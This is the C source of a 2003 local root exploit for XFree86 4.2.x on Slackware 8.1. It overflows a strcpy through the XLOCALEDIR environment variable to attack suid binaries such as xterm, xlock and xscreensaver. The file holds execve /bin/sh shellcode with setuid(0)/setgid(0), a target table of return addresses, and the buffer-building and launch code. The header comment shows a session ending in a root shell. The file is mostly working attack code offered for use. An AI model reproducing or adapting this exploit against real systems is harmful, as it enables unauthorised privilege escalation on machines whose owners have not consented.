/**** 
***
** oC-localX.c - XFree86 Version 4.2.x local root exploit
** By dcryptr && tarranta / oC
***  
** Tested against: Slackware 8.1
***
** This bug was found by tarranta and dcryptr 3 january 2003.
** Its a strcpy in the xf86 libraries that we exploit, using
** the bug to get the root privileges. If you put to much data
** in the XLOCALEDIR environment variable all programs using this
** library will cause a segmnetation fault. Some wierd reason makes 
** the program not execute the first 8 bytes of the shellcode.
***
** Demonstration - here we use xlock as the target
** ----------------------------------------------
**  martin@gDeU56:~$ ls -l /usr/X11R6/bin/xlock
**  -rws--x--x    1 root     bin       2193628 May 30  2002 /usr/X11R6/bin/xlock
**  export XLOCALEDIR=`perl -e 'print "A" x 6000'`
**  martin@gDeU56:~$ xlock
**  Segmentation fault
**  eip      0x41414141       0x41414141
**
**  Exploitation:
**   martin@gDeU56:~$ ./oC-XFree86-4.2.0 -t 2
**   --- XFree86 Version 4.2.0 / X Window System - local root exploit ---
**   [+] by: dcryptr && tarranta
**   [+] oC-2003 - http://crionized.net/
**   [+] attacking: /usr/X11R6/bin/xlock
**   [+] using ret: 0xbfffe86d
**   [+] spawning root shell!!!!
**   sh-2.05a# id;uname -a
**   uid=0(root) gid=0(root) groups=100(users)
**   Linux gDeU56 2.4.18 #4 Fri May 31 01:25:31 PDT 2002 i686 unknown
***
** Remember that there is more than one suid file using this lib.
** /usr/X11R6/bin/xterm
** /usr/X11R6/bin/xscreensaver
*** 
** This may be vulnerable in other distros!!!
** We are currently making out new targets. look on our page 
** for the newest version!
***
** (C) COPYRIGHT oC 2003
** All Rights Reserved
*******************************************************************************************************
** GREETS: dgram, lonely_, upstream, evilrip
***
****/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/errno.h>

#define VERSION "0.9"

/* 57 bytes shellcode by dcryptr */
static char shellcode[] = 
	/* setuid(0); (ignored) */
	"\x31\xdb"				/* xor %ebx,%ebx */
	"\x89\xd8"				/* mov %ebx,%eax */
	"\xb0\x17"				/* mov $0x17,%al */
	"\xcd\x80"				/* int $0x80     */
	
	/* setuid(0); */
	"\x31\xdb"				/* xor %ebx,%ebx */
	"\x89\xd8"				/* mov %ebx,%eax */
	"\xb0\x17"				/* mov $0x17,%al */
	"\xcd\x80"				/* int $0x80     */
	
	/* setgid(0); */
	"\x31\xdb"				/* xor %ebx,%ebx */
	"\x89\xd8"				/* mov %ebx,%eax */
	"\xb0\x2e"				/* mov $0x2e,%al */
	"\xcd\x80"				/* int $0x80     */
	
	/* /bin/sh execve(); */
	"\x31\xc0"				/* xor  %eax,%eax   */
	"\x50"					/* push %eax        */
	"\x68\x2f\x2f\x73\x68"			/* push $0x68732f2f */
	"\x68\x2f\x62\x69\x6e"			/* push $0x6e69622f */
	"\x89\xe3"				/* mov  %esp,%ebx   */
	"\x50"					/* push %eax        */
	"\x53"					/* push %ebx        */
	"\x89\xe1"				/* mov  %esp,%ecx   */
	"\x31\xd2"				/* xor  %edx,%edx   */
	"\xb0\x0b"				/* mov  $0xb,%al    */
	"\xcd\x80"				/* int  $0x80       */
	
	/* exit(0); */
	"\x31\xdb"				/* xor %ebx,%ebx */
	"\x89\xd8"				/* mov %ebx,%eax */
	"\xb0\x01"				/* mov $0x01,%al */
	"\xcd\x80";				/* int $0x80     */

struct target {
    int 		index;
    char 		*distro;
    char 		*dest;
    char 		*name;
    u_long		retaddr;
    int			LEN;
};

/* 
 * There is like 200+ binaries that segfaults to this 
 * vuln but they are not suids. this is all the suids
 * I found. Soundtracker is a music tracker that I am 
 * using and its vuln to.
 */
struct target exploit[] = { 
	{ 1, "Slackware 8.1 -", "/usr/X11R6/bin/xterm", 
	    "xterm", 0xbfffe86d, 6000 },
	
	{ 2, "Slackware 8.1 -", "/usr/X11R6/bin/xlock", 
	    "xlock", 0xbfffe86d, 6000 }, 
	
	{ 3, "Slackware 8.1 -", "/usr/X11R6/bin/xscreensaver", 
	    "xscreensaver", 0xbfffe86e, 6000 },
	    
	{ 0, NULL, NULL, NULL, 0, 0 }
};

void usage(char *cmd);

int main(int argc, char **argv)
{
    int 	i;
    int 	type;
    int		size;
    int 	options;
    long 	retaddr;
    char 	buffer[6000];

    if(argc == 1) {
		usage(argv[0]);
		exit(0);
    }

    /* options of this exploit */
    while((options = getopt(argc, argv, "ht:")) != EOF) {
		switch(options) {
		    case 'h': 
				usage(argv[0]);
				exit(0);
			case 't': 
				type = atoi(optarg);
		    
				if (type > 3 || type < 0) {
				    printf("Out of range!!\n");
				    exit(0);
				}
		    
				if (type == 0) {
					usage(argv[0]);
					printf("num . description\n"
					"----+----------------------------------------\n");			
					for (i = 0; exploit[i].dest; i++)
						fprintf(stderr, "[%d] | %s %s\n", exploit[i].index, exploit[i].distro, exploit[i].dest);
				    
					exit(1);
				}		    
				break;	
			default:
				usage(argv[0]);
				exit(0);
		}
    }	

    size    = exploit[type-1].LEN;
    retaddr = exploit[type-1].retaddr;

    fprintf(stderr, "\n--- oC-localX "VERSION" - XFree86 Version 4.2.0 local root exploit ---\n"
					"[+] by: dcryptr && tarranta\n"
					"[+] oC-2003 - http://crionized.net/\n"
					"[+] attacking: %s\n"
					"[+] using ret: 0x%8lx\n"
					"[+] spawning shell!!!!\n", exploit[type-1].dest, retaddr);

	for (i = 0; i < size; i += 4)
		*(long *)&buffer[i] = retaddr;
	
    memcpy(buffer + 1, shellcode, strlen(shellcode));

    setenv("XLOCALEDIR", buffer, 1);	/* seting env variable */

    if ( (execl(exploit[type-1].dest, exploit[type-1].name, NULL)) == -1) {
		fprintf(stderr, "Try another target, you scriptkid!\n\n");
		exit(-1);
	}

	return(0);
}

void usage(char *cmd)
{
    fprintf(stderr, "\n--- oC-localX "VERSION" - XFree86 Version 4.2.0 local root exploit ---\n"
					"by dcryptr && tarranta\n"
					"oC-2003 - http://crionized.net/\n\n"
					"usage: %s [-h] [-t <num>]\n"
					"__options\n"
					" -h\t- this help\n"
					" -t num\t- choose target (0 for list)\n\n", cmd);
}	    		    
